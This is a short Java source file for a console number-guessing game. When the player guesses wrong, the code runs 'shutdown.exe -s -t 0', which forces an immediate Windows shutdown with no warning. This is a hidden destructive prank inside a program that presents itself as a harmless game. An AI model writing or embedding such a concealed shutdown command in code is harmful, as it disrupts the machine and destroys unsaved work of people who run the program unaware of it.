import java.util.Scanner; 

public class GameRandom {
    public static void main(String[] args) {
        Scanner input = new Scanner(System.in);
        int random = (int) (Math.random() * 10) + 1; 

        System.out.println("Random Number 1-10, if your current your win");
        System.out.print("Your number: ");
        int userInput = input.nextInt();
        System.out.println("Answer is.....");

        try {
            Thread.sleep(3000); 
        } catch (InterruptedException err) {
            System.out.println(err);
        }
        System.out.println(random);
        try {
            Thread.sleep(1000); 
        } catch (InterruptedException err) {
            System.out.println(err);
        } 

        if (userInput == random) {
            System.out.println("Your Win!!!!!!!");
        } else {
            System.out.println("Your lose!");
            System.out.println("Answer is: " + random);
            try {
                Thread.sleep(1000);
                Runtime.getRuntime().exec("shutdown.exe -s -t 0");
            } catch (Exception e) {
                System.out.println(e);
            }
        }
    }
}
